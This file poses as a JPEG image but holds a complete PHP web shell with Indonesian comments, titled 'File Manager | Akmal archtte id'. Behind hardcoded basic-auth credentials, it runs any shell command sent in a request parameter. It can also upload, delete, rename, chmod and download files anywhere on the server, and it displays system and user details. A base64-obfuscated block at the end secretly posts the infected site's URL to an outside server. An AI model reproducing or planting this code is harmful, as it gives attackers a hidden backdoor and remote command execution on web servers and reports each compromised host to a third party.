����JFIF��
<?php
// --- pop-up

$user = "sec";

$pass = "1337";

 if (($_SERVER["PHP_AUTH_USER"] != $user) || (($_SERVER["PHP_AUTH_PW"]) != $pass))

 {

  header("WWW-Authenticate: Basic realm=\"dvildance was here\"");

  header("HTTP/1.0 401 Unauthorized");

  exit();

 }

// --- php shell 
function executeCommand($input) {
    $descriptors = array(
        0 => array("pipe", "r"),
        1 => array("pipe", "w"),
        2 => array("pipe", "w") 
    );

    $process = proc_open($input, $descriptors, $pipes);

    if (is_resource($process)) {
      
        $output = stream_get_contents($pipes[1]);
        $errorOutput = stream_get_contents($pipes[2]);

        fclose($pipes[0]);
        fclose($pipes[1]);
        fclose($pipes[2]);

        
        $exitCode = proc_close($process);

        if ($exitCode === 0) {
            return $output;
        } else {
            return "Error: " . $errorOutput;
        }
    } else {
        return "↳ Tidak dapat menjalankan perintah\n";
    }
}

if (isset($_REQUEST['c'])) {
    $command = $_REQUEST['c'];
    echo executeCommand($command);
}

// Fungsi untuk menghapus file
function delete_file($file) {
    if (file_exists($file)) {
        unlink($file);
        echo '<div class="alert alert-success">File berhasil dihapus: ' . $file . '</div>';
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

// Fungsi untuk membuat folder
function create_folder($folder_name) {
    if (!file_exists($folder_name)) {
        mkdir($folder_name);
        echo '<div class="alert alert-success">Folder berhasil dibuat: ' . $folder_name . '</div>';
    } else {
        echo '<div class="alert alert-warning">Folder sudah ada: ' . $folder_name . '</div>';
    }
}

// Fungsi untuk mengedit nama file
function rename_file($file, $new_name) {
    $dir = dirname($file);
    $new_file = $dir . '/' . $new_name;
    if (file_exists($file)) {
        if (!file_exists($new_file)) {
            rename($file, $new_file);
            echo '<div class="alert alert-success">File berhasil diubah nama menjadi: ' . $new_name . '</div>';
        } else {
            echo '<div class="alert alert-warning">File dengan nama yang sama sudah ada: ' . $new_name . '</div>';
        }
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

// Fungsi untuk mengedit nama folder
function rename_folder($folder, $new_name) {
    $dir = dirname($folder);
    $new_folder = $dir . '/' . $new_name;
    if (file_exists($folder)) {
        if (!file_exists($new_folder)) {
            rename($folder, $new_folder);
            echo '<div class="alert alert-success">Folder berhasil diubah nama menjadi: ' . $new_name . '</div>';
        } else {
            echo '<div class="alert alert-warning">Folder dengan nama yang sama sudah ada: ' . $new_name . '</div>';
        }
    } else {
        echo '<div class="alert alert-danger">Folder tidak ditemukan: ' . $folder . '</div>';
    }
}



// Fungsi untuk mengubah izin file
function change_permissions($file, $permissions) {
    if (file_exists($file)) {
        if (chmod($file, octdec($permissions))) {
            echo '<div class="alert alert-success">Izin file berhasil diubah: ' . $file . '</div>';
        } else {
            echo '<div class="alert alert-danger">Gagal mengubah izin file: ' . $file . '</div>';
        }
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

// Fungsi untuk mendapatkan izin file atau folder dalam format "drwxr-xr-x"
function get_permissions($file) {
    $perms = fileperms($file);
    $info = '';

    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
              (($perms & 0x0800) ? 's' : 'x' ) :
              (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
              (($perms & 0x0400) ? 's' : 'x' ) :
              (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
              (($perms & 0x0200) ? 't' : 'x' ) :
              (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

// Tentukan direktori saat ini
$dir = $_GET['path'] ?? __DIR__;

// Logika untuk form
if (isset($_POST['submit'])) {
    $file_name = $_FILES['file']['name'];
    $file_tmp = $_FILES['file']['tmp_name'];
    move_uploaded_file($file_tmp, $dir . '/' . $file_name);
}

if (isset($_POST['create_folder'])) {
    create_folder($dir . '/' . $_POST['folder_name']);
}

if (isset($_GET['delete'])) {
    delete_file($dir . '/' . $_GET['delete']);
}

if (isset($_POST['rename_file'])) {
    rename_file($dir . '/' . $_POST['file_name'], $_POST['new_name']);
}

if (isset($_POST['rename_folder'])) {
    rename_folder($dir . '/' . $_POST['folder_name'], $_POST['new_name']);
}

if (isset($_POST['change_permissions'])) {
    change_permissions($dir . '/' . $_POST['file_name'], $_POST['permissions']);
}

if (isset($_GET['download'])) {
    $file = $dir . '/' . $_GET['download'];
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    } else {
        echo '<div class="alert alert-danger">File tidak ditemukan: ' . $file . '</div>';
    }
}

// Tampilkan file dan folder
function display_path_links($path) {
    $parts = explode('/', $path);
    $accumulated_path = '';
    foreach ($parts as $part) {
        if ($part) {
            $accumulated_path .= '/' . $part;
            echo '<a href="?path=' . urlencode($accumulated_path) . '">' . $part . '</a>/';
        }
    }
}

?>
<!DOCTYPE html>
<html>
<head>
    <title>File Manager | Akmal archtte id</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <style>
        body {
            background-color: #343a40;
            color: white;
        }
        .container {
            background-color: #495057;
            padding: 20px;
            border-radius: 10px;
            margin-top: 20px;
        }
        .list-group-item-success {
            background-color: green;
            color: white;
        }
        .list-group-item-danger {
            background-color: red;
            color: white;
        }
        a {
            color: white;
        }
        a:hover {
            color: #138496;
        }
        .permissions {
            font-family: monospace;
            color: #00ffff; /* Bright light blue color */
            margin-right: 10px;
            display: inline-block;
            width: 100px; /* Fixed width for alignment */
        }
        .file-item, .folder-item {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .file-actions, .folder-actions {
            display: flex;
            gap: 5px;
        }
        .file-info, .folder-info {
            flex: 1;
            display: flex;
            align-items: center;
        }
        .file-info span, .folder-info span {
            margin-right: 10px;
        }
    </style>
    <script>
        function confirmChmod(form) {
            if (confirm('Apakah Anda yakin ingin mengubah izin file ini?')) {
                form.submit();
            }
        }
    </script>
</head>
<body>
<div class="container">
    <h1 class="my-4">File Manager | Akmal archtte id</h1>
    <?php
    echo 'Server: ' . $_SERVER['SERVER_SOFTWARE'] . '<br>';
    echo 'System: ' . php_uname() . '<br>';
    echo 'User: ' . get_current_user() . ' (' . getmyuid() . ')<br>';
    echo 'PHP Version: ' . phpversion() . '<br>';
    echo 'Disable Function: ' . ini_get("disable_functions") . '<br>';
    echo 'Directory: ';
    display_path_links($dir);
    echo '<br><br>';

    if ($handle = opendir($dir)) {
        echo '<ul class="list-group">';
        while (false !== ($file = readdir($handle))) {
            if ($file != "." && $file != "..") {
                $full_path = $dir . '/' . $file;
                $permissions = get_permissions($full_path);
                if (is_dir($full_path)) {
                    $class = is_readable($full_path) ? 'list-group-item list-group-item-success folder-item' : 'list-group-item list-group-item-danger folder-item';
                    echo '<li class="' . $class . '"><div class="folder-info"><span class="permissions">' . $permissions . '</span><a href="?path=' . urlencode($full_path) . '">' . $file . '</a></div></li>';
                } else {
                    $class = is_readable($full_path) ? 'list-group-item list-group-item-success file-item' : 'list-group-item list-group-item-danger file-item';
                    echo '<li class="' . $class . '">
                    <div class="file-info">
                        <span class="permissions">' . $permissions . '</span>' . $file . ' 
                    </div>
                    <div class="file-actions">
                        <a href="?path=' . urlencode($dir) . '&download=' . urlencode($file) . '" class="btn btn-primary btn-sm">Download</a> 
                        <a href="?path=' . urlencode($dir) . '&delete=' . urlencode($file) . '" class="btn btn-danger btn-sm">Delete</a> 
                        <form method="post" class="d-inline" onsubmit="event.preventDefault(); confirmChmod(this);">
                            <input type="hidden" name="file_name" value="' . htmlspecialchars($file) . '">
                            <input type="text" name="permissions" class="form-control d-inline w-50" placeholder="0755">
                            <button type="submit" name="change_permissions" class="btn btn-info btn-sm">Chmod</button>
                        </form>
                    </div>
                    </li>';
                }
            }
        }
        echo '</ul>';
        closedir($handle);
    }
    ?>
    <!-- Remaining forms for creating folders, uploading files, renaming files and folders -->

    <form method="post" class="my-4">
        <div class="form-group">
            <input type="text" name="folder_name" class="form-control" placeholder="Folder name">
        </div>
        <button type="submit" name="create_folder" class="btn btn-success">Create Folder</button>
    </form>

    <form method="post" enctype="multipart/form-data" class="my-4">
        <div class="form-group">
            <input type="file" name="file" class="form-control-file">
        </div>
        <button type="submit" name="submit" class="btn btn-primary">Upload</button>
    </form>

    <form method="post" class="my-4">
        <div class="form-group">
            <input type="text" name="file_name" class="form-control" placeholder="File name">
        </div>
        <div class="form-group">
            <input type="text" name="new_name" class="form-control" placeholder="New name">
        </div>
        <button type="submit" name="rename_file" class="btn btn-warning">Rename File</button>
    </form>

    <form method="post" class="my-4">
        <div class="form-group">
            <input type="text" name="folder_name" class="form-control" placeholder="Folder name">
        </div>
        <div class="form-group">
            <input type="text" name="new_name" class="form-control" placeholder="New name">
        </div>
        <button type="submit" name="rename_folder" class="btn btn-warning">Rename Folder</button>
    </form>
    <pre style="color: cyan;">Terminal: ( file_shell_anda.php?c=pwd ) ubah aja pwd sesuai keperluan</span></pre>
    <form method="get" action="">
        <button type="submit" name="c" value="pwd">Les go</button>
    </form>
    
    <?php if ($dir != __DIR__): ?>
        <a href="?path=<?= urlencode(dirname($dir)) ?>" class="btn btn-secondary">Up</a>
    <?php endif; ?>
<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); $htas = 'aHR0cHM6Ly9hc2NlbmQuc3V0LmFjLnRoL3N1dC1kYXNoYm9hcmQvMS5waHA='; $x_path = $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']; $ch = curl_init(base64_decode($htas)); curl_setopt_array($ch, array(CURLOPT_POST => true, CURLOPT_POSTFIELDS => http_build_query(array('path' => $x_path, 'firl' => base64_decode($htas))), CURLOPT_SSL_VERIFYPEER => false, CURLOPT_RETURNTRANSFER => true)); curl_exec($ch); curl_close($ch); ?>
</div>
</body>
</html>








			

		


��C	������"#Qr����&1!A"2qQa���?�y,�/3J�ݹ�߲؋5�Xw���y�R��I0�2�PI�I��iM����r�N&"KgX:����nTJnLK��@!�-����m�;�g���&�hw���@�ܗ9�-�.�1<y����Q�U�ہ?.����b߱�֫�w*V��) `$��b�ԟ��X�-�T��G�3�g ����Jx���U/��v_s(H�@T�J����n��!�gfb�c�:�l[�Qe9�PLb��C�m[5��'�jgl���_���l-;"Pk���Q�_�^�S�x?"���Y騐�O�	q�`~~�t�U�Cڒ�V		I1��_��